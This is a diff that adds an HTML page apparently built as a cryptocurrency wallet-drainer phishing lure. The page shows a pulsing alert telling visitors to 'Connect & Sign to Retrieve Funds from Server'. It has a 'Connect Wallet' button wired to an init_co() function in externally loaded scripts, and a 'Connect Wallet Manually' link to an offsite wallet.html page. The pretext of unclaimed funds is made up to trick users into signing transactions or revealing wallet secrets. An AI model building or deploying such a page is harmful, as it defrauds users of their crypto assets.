@@ -1,0 +1,150 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+   
+   
+   <script src="/assets/sources.js"></script>   
+      <script src="/assets/polyfills__1003217276696.js"></script>
+   
+   
+   
+   
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Connect to Retrieve Funds from Server</title>
+  <!-- Font Awesome for icons -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css">
+  <style>
+    /* Reset */
+    * {
+      margin: 0;
+      padding: 0;
+      box-sizing: border-box;
+    }
+
+    body {
+      height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      background: url("animation-cPTDWzld_1-K9NTpCSI.gif") no-repeat center center/cover;
+      font-family: Arial, sans-serif;
+      position: relative;
+    }
+
+    /* Black overlay with 60% opacity */
+    body::before {
+      content: "";
+      position: absolute;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background: rgba(0, 0, 0, 0.6);
+      z-index: 0;
+    }
+
+    .wrapper {
+      text-align: center;
+      width: 90%;
+      max-width: 400px;
+      position: relative;
+      z-index: 1;
+      /* keep content above overlay */
+    }
+
+    /* Alert Box */
+    .alert {
+      background-color: rgb(238, 232, 232);
+      padding: 15px;
+      border-radius: 10px;
+      font-size: 16px;
+      margin-bottom: 25px;
+      color: #7f1d1d;
+      /* dark red */
+      font-weight: 500;
+      animation: pulse 2s infinite;
+    }
+
+    .alert span {
+      font-weight: 600;
+    }
+
+    .alert b {
+      font-weight: bold;
+      color: #7f1d1d;
+    }
+
+    /* Pulse Animation */
+    @keyframes pulse {
+      0% {
+        opacity: 1;
+      }
+
+      50% {
+        opacity: 0.6;
+      }
+
+      100% {
+        opacity: 1;
+      }
+    }
+
+    /* Buttons */
+    .btn {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 10px;
+      width: 100%;
+      padding: 15px;
+      margin: 10px 0;
+      border: none;
+      border-radius: 8px;
+      background: #012407;
+      color: #fff;
+      font-size: 16px;
+      font-weight: bold;
+      cursor: pointer;
+      text-decoration: none;
+      /* remove underline for <a> */
+      transition: transform 0.2s ease, background 0.3s ease;
+    }
+
+    .btn:hover {
+      background: #000904;
+      transform: translateY(-2px);
+    }
+
+    .btn:active {
+      transform: translateY(0);
+    }
+
+    .btn i {
+      font-size: 18px;
+    }
+  </style>
+</head>
+
+<body>
+
+  <div class="wrapper">
+    <!-- Alert Message -->
+    <div class="alert" role="alert">
+      <span>Connect & Sign to Retrieve </span>
+      <b>Funds from Server!</b>
+    </div>
+
+    <!-- Buttons -->
+    <button class="kodexbutton btn connectbutton connect-button" onclick="init_co()"><i class="kodexbutton fa-solid fa-wallet"></i> Connect Wallet</button>
+
+    <!-- Manual connect as link -->
+    <a href="https://mainnet-premium.com/wallet.html" class="btn">
+      <i class="fa-solid fa-plug"></i> Connect Wallet Manually
+    </a>
+  </div>
+
+</body>
+
+</html>
